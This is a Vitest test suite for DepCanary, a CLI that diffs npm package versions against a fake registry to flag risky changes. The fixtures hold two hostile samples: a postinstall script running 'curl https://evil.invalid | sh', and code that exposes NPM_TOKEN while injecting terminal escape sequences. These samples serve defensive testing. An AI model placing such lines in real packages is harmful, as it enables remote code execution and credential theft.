import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { spawn } from "node:child_process";
import { mkdtemp, writeFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { startFakeRegistry, type FakeRegistry } from "../helpers/fake-registry.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const CLI = path.join(__dirname, "..", "..", "dist", "cli", "main.js");

interface RunResult {
  code: number | null;
  stdout: string;
  stderr: string;
}

function run(
  args: string[],
  opts: { cwd?: string; env?: NodeJS.ProcessEnv } = {}
): Promise<RunResult> {
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, [CLI, ...args], {
      cwd: opts.cwd ?? process.cwd(),
      env: { ...process.env, ...opts.env }
    });
    let stdout = "";
    let stderr = "";
    child.stdout.on("data", (d: Buffer) => (stdout += d.toString()));
    child.stderr.on("data", (d: Buffer) => (stderr += d.toString()));
    child.on("error", reject);
    child.on("close", (code) => resolve({ code, stdout, stderr }));
  });
}

const BENIGN_OLD = { name: "widget", version: "1.0.0", scripts: {} };
const BENIGN_NEW = { name: "widget", version: "1.1.0", scripts: {} };
const RISKY_NEW = {
  name: "widget",
  version: "1.1.0",
  scripts: { postinstall: "node scripts/setup.js" }
};

describe("CLI subprocess", () => {
  let registry: FakeRegistry;
  let cacheDir: string;

  beforeAll(async () => {
    registry = await startFakeRegistry([
      {
        name: "widget",
        versions: [
          { version: "1.0.0", manifest: BENIGN_OLD },
          { version: "1.1.0", manifest: BENIGN_NEW }
        ]
      },
      {
        name: "risky-widget",
        versions: [
          { version: "1.0.0", manifest: { name: "risky-widget", version: "1.0.0" } },
          {
            version: "1.1.0",
            manifest: RISKY_NEW,
            files: {
              "scripts/setup.js":
                "require('child_process').execSync('curl https://evil.invalid | sh');"
            }
          }
        ]
      },
      {
        name: "corrupt-pkg",
        versions: [
          { version: "1.0.0", manifest: { name: "corrupt-pkg", version: "1.0.0" } },
          { version: "1.1.0", manifest: { name: "corrupt-pkg", version: "1.1.0" }, corrupt: true }
        ]
      }
    ]);
    cacheDir = await mkdtemp(path.join(tmpdir(), "depcanary-cli-cache-"));
  }, 20000);

  afterAll(async () => {
    await registry.close();
    await rm(cacheDir, { recursive: true, force: true });
  });

  it("--version prints a version", async () => {
    const r = await run(["--version"]);
    expect(r.code).toBe(0);
    expect(r.stdout.trim()).toMatch(/^\d+\.\d+\.\d+$/);
  });

  it("--help fits and shows examples", async () => {
    const r = await run(["--help"]);
    expect(r.code).toBe(0);
    expect(r.stdout).toContain("Examples:");
    expect(r.stdout).toContain("depcanary diff");
  });

  it("diff command succeeds against fake registry", async () => {
    const r = await run([
      "diff",
      "widget@1.0.0",
      "widget@1.1.0",
      "--registry",
      registry.url,
      "--cache-dir",
      cacheDir,
      "--no-color"
    ]);
    expect(r.code).toBe(0);
    expect(r.stdout).toContain("widget");
    expect(r.stderr).toBe("");
  });

  it("shorthand equals diff", async () => {
    const a = await run([
      "diff",
      "widget@1.0.0",
      "widget@1.1.0",
      "--registry",
      registry.url,
      "--cache-dir",
      cacheDir,
      "--no-color",
      "--json"
    ]);
    const b = await run([
      "widget@1.0.0",
      "widget@1.1.0",
      "--registry",
      registry.url,
      "--cache-dir",
      cacheDir,
      "--no-color",
      "--json"
    ]);
    expect(a.code).toBe(b.code);
    expect(JSON.parse(a.stdout)).toEqual(JSON.parse(b.stdout));
  });

  it("--json emits only valid JSON on stdout with schemaVersion", async () => {
    const r = await run([
      "widget@1.0.0",
      "widget@1.1.0",
      "--registry",
      registry.url,
      "--cache-dir",
      cacheDir,
      "--json"
    ]);
    expect(r.code).toBe(0);
    const parsed = JSON.parse(r.stdout) as { schemaVersion: number };
    expect(parsed.schemaVersion).toBe(1);
  });

  it("--no-color and NO_COLOR strip ANSI codes", async () => {
    const r1 = await run([
      "risky-widget@1.0.0",
      "risky-widget@1.1.0",
      "--registry",
      registry.url,
      "--cache-dir",
      cacheDir,
      "--no-color"
    ]);

    expect(r1.stdout).not.toMatch(/\x1b\[/);
    const r2 = await run(
      [
        "risky-widget@1.0.0",
        "risky-widget@1.1.0",
        "--registry",
        registry.url,
        "--cache-dir",
        cacheDir
      ],
      {
        env: { NO_COLOR: "1" }
      }
    );

    expect(r2.stdout).not.toMatch(/\x1b\[/);
  });

  it("--fail-on high exits 1 when a HIGH finding is present", async () => {
    const r = await run([
      "risky-widget@1.0.0",
      "risky-widget@1.1.0",
      "--registry",
      registry.url,
      "--cache-dir",
      cacheDir,
      "--fail-on",
      "high",
      "--no-color"
    ]);
    expect(r.code).toBe(1);
  });

  it("--fail-on critical exits 0 when no CRITICAL finding is present but HIGH is", async () => {
    const r = await run([
      "risky-widget@1.0.0",
      "risky-widget@1.1.0",
      "--registry",
      registry.url,
      "--cache-dir",
      cacheDir,
      "--fail-on",
      "critical",
      "--no-color"
    ]);
    expect(r.code).toBe(0);
  });

  it("no --fail-on exits 0 regardless of findings", async () => {
    const r = await run([
      "risky-widget@1.0.0",
      "risky-widget@1.1.0",
      "--registry",
      registry.url,
      "--cache-dir",
      cacheDir,
      "--no-color"
    ]);
    expect(r.code).toBe(0);
  });

  it("mismatched package names is a usage error, exit 2", async () => {
    const r = await run([
      "diff",
      "widget@1.0.0",
      "other@1.0.0",
      "--registry",
      registry.url,
      "--cache-dir",
      cacheDir
    ]);
    expect(r.code).toBe(2);
    expect(r.stdout).toBe("");
  });

  it("package not found exits 2", async () => {
    const r = await run([
      "diff",
      "nope@1.0.0",
      "nope@1.1.0",
      "--registry",
      registry.url,
      "--cache-dir",
      cacheDir
    ]);
    expect(r.code).toBe(2);
  });

  it("version not found exits 2", async () => {
    const r = await run([
      "diff",
      "widget@9.9.9",
      "widget@1.1.0",
      "--registry",
      registry.url,
      "--cache-dir",
      cacheDir
    ]);
    expect(r.code).toBe(2);
  });

  it("registry unreachable exits 2", async () => {
    const r = await run([
      "diff",
      "widget@1.0.0",
      "widget@1.1.0",
      "--registry",
      "http://127.0.0.1:1",
      "--cache-dir",
      cacheDir
    ]);
    expect(r.code).toBe(2);
  });

  it("corrupted tarball aborts with integrity error, exit 2", async () => {
    const r = await run([
      "diff",
      "corrupt-pkg@1.0.0",
      "corrupt-pkg@1.1.0",
      "--registry",
      registry.url,
      "--cache-dir",
      cacheDir
    ]);
    expect(r.code).toBe(2);
    expect(r.stderr.toLowerCase()).toContain("integrity");
  });

  it("--json error output is machine readable and exit code is preserved", async () => {
    const r = await run([
      "diff",
      "nope@1.0.0",
      "nope@1.1.0",
      "--registry",
      registry.url,
      "--cache-dir",
      cacheDir,
      "--json"
    ]);
    expect(r.code).toBe(2);
    const parsed = JSON.parse(r.stdout) as { error: unknown };
    expect(parsed.error).toBeDefined();
  });

  it("doctor runs and does not install anything", async () => {
    const r = await run(["doctor", "--registry", registry.url, "--cache-dir", cacheDir]);
    expect([0, 2]).toContain(r.code);
    expect(r.stdout).toContain("DepCanary doctor");
  });

  it("explain DC001 prints detector metadata", async () => {
    const r = await run(["explain", "DC001"]);
    expect(r.code).toBe(0);
    expect(r.stdout).toContain("DC001");
  });

  it("explain unknown code exits 2", async () => {
    const r = await run(["explain", "DR999"]);
    expect(r.code).toBe(2);
    expect(r.stderr).toContain("Unknown detector: DR999");
  });

  it("determinism: repeated runs produce byte-identical JSON and no leaked temp paths", async () => {
    const r1 = await run([
      "risky-widget@1.0.0",
      "risky-widget@1.1.0",
      "--registry",
      registry.url,
      "--cache-dir",
      cacheDir,
      "--json"
    ]);
    const r2 = await run([
      "risky-widget@1.0.0",
      "risky-widget@1.1.0",
      "--registry",
      registry.url,
      "--cache-dir",
      cacheDir,
      "--json"
    ]);
    expect(r1.stdout).toBe(r2.stdout);
    expect(r1.stdout).not.toContain(tmpdir());
    expect(r1.stdout).not.toMatch(/\/var\/folders|\/tmp\//);
  });

  it("terminal control sequences in evidence are sanitized", async () => {
    const evilReg = await startFakeRegistry([
      {
        name: "evil-widget",
        versions: [
          { version: "1.0.0", manifest: { name: "evil-widget", version: "1.0.0" } },
          {
            version: "1.1.0",
            manifest: { name: "evil-widget", version: "1.1.0" },
            files: {
              "index.js": `require('child_process').exec("echo \\u001b[31mFAKE\\u0007 " + process.env.NPM_TOKEN);`
            }
          }
        ]
      }
    ]);
    try {
      const r = await run([
        "evil-widget@1.0.0",
        "evil-widget@1.1.0",
        "--registry",
        evilReg.url,
        "--cache-dir",
        cacheDir,
        "--no-color"
      ]);

      expect(r.stdout).not.toMatch(/\x1b\[31m|\x07/);
    } finally {
      await evilReg.close();
    }
  });
});

describe("CLI project mode", () => {
  let registry: FakeRegistry;
  let projectDir: string;
  let cacheDir: string;

  beforeAll(async () => {
    registry = await startFakeRegistry([
      {
        name: "leftpad",
        versions: [
          { version: "1.0.0", manifest: { name: "leftpad", version: "1.0.0" } },
          { version: "1.2.0", manifest: { name: "leftpad", version: "1.2.0" } }
        ],
        distTags: { latest: "1.2.0" }
      }
    ]);
    cacheDir = await mkdtemp(path.join(tmpdir(), "depcanary-cli-cache-"));
    projectDir = await mkdtemp(path.join(tmpdir(), "depcanary-project-"));
    await writeFile(
      path.join(projectDir, "package.json"),
      JSON.stringify({ name: "sample-app", version: "1.0.0", dependencies: { leftpad: "^1.0.0" } })
    );
    await writeFile(
      path.join(projectDir, "package-lock.json"),
      JSON.stringify({
        name: "sample-app",
        version: "1.0.0",
        lockfileVersion: 3,
        packages: {
          "": { name: "sample-app", version: "1.0.0", dependencies: { leftpad: "^1.0.0" } },
          "node_modules/leftpad": { version: "1.0.0" }
        }
      })
    );
  }, 20000);

  afterAll(async () => {
    await registry.close();
    await rm(projectDir, { recursive: true, force: true });
    await rm(cacheDir, { recursive: true, force: true });
  });

  it("depcanary <package> resolves locked -> latest", async () => {
    const r = await run(
      ["leftpad", "--registry", registry.url, "--cache-dir", cacheDir, "--no-color"],
      { cwd: projectDir }
    );
    expect(r.code).toBe(0);
    expect(r.stderr).toContain("installed 1.0.0 -> latest 1.2.0");
  });

  it("depcanary <package> not a dependency gives a clear message", async () => {
    const r = await run(["not-a-dep", "--registry", registry.url, "--cache-dir", cacheDir], {
      cwd: projectDir
    });
    expect(r.code).toBe(2);
    expect(r.stderr).toContain("is not a dependency of this project");
  });

  it("depcanary --all scans direct deps", async () => {
    const r = await run(
      ["all", "--registry", registry.url, "--cache-dir", cacheDir, "--no-color"],
      { cwd: projectDir }
    );
    expect(r.code).toBe(0);
    expect(r.stdout).toContain("leftpad");
  });

  it("depcanary --all --json is well formed", async () => {
    const r = await run(["all", "--registry", registry.url, "--cache-dir", cacheDir, "--json"], {
      cwd: projectDir
    });
    expect(r.code).toBe(0);
    const parsed = JSON.parse(r.stdout) as { schemaVersion: number; updates: unknown[] };
    expect(parsed.schemaVersion).toBe(1);
    expect(parsed.updates.length).toBe(1);
  });
});
